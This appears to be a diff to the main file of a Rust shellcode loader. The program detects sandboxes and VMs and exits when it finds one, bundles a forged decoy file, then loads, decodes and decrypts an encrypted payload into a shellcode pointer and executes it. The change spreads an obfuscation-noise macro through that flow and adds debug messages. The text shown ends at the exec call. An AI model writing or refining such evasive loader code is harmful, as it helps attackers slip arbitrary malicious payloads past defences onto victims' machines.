@@ -10,7 +10,6 @@ mod forgery;
 #[cfg(feature = "sandbox")]
 mod guard;
 
-use utils::obfuscation_noise;
 use load_payload::load_payload;
 use decrypt::decrypt;
 use decode::decode_payload;
@@ -25,6 +24,7 @@ fn exit_program() -> ! {
 }
 
 fn start_program() {
+    rsl::obfuscation_noise_macro!();
     #[cfg(feature = "debug")]
     print_message("RSL started in debug mode.");
 
@@ -40,19 +40,29 @@ fn main() {
         #[cfg(feature = "debug")] 
         print_message("Sandbox/VM detected. Exiting...");
         exit_program();
+    } else {
+        #[cfg(feature = "debug")] 
+        print_message("Pass Sandbox/VM detection.");
     }
-
-    obfuscation_noise();
 
     #[cfg(feature = "with_forgery")]
     if let Err(_e) = forgery::bundle::bundlefile() {        
         #[cfg(feature = "debug")]        
         print_error("Failed to bundle:", &_e);
         exit_program();
+    } else {
+        #[cfg(feature = "debug")] 
+        print_message("Bundling succeeded.");
+        rsl::obfuscation_noise_macro!();
     }
-    
+
     let encrypted_data = match load_payload() {
-        Ok(data) => data,
+        Ok(data) => {
+            #[cfg(feature = "debug")]
+            print_message("Payload loaded successfully.");
+            rsl::obfuscation_noise_macro!();
+            data
+        },
         Err(_e) => {
             #[cfg(feature = "debug")]
             print_error("Failed to load:", &_e);
@@ -62,19 +72,20 @@ fn main() {
 
     let decrypted_data = decode_payload(&encrypted_data).unwrap();
 
-    obfuscation_noise();
-
     unsafe {
         let (shellcode_ptr, _shellcode_len) = match decrypt(&decrypted_data) {
-            Ok(p) => p,
+            Ok(p) => {
+                #[cfg(feature = "debug")]
+                print_message("Payload decrypted successfully.");
+                rsl::obfuscation_noise_macro!();
+                p
+            },
             Err(_e) => {
                 #[cfg(feature = "debug")]
                 print_error("Failed to decrypt:", &_e);
                 exit_program();
             }
         };
-        
-        obfuscation_noise();
 
         #[cfg(feature = "pattern1")]
         if let Err(_e) = exec(shellcode_ptr as usize) {
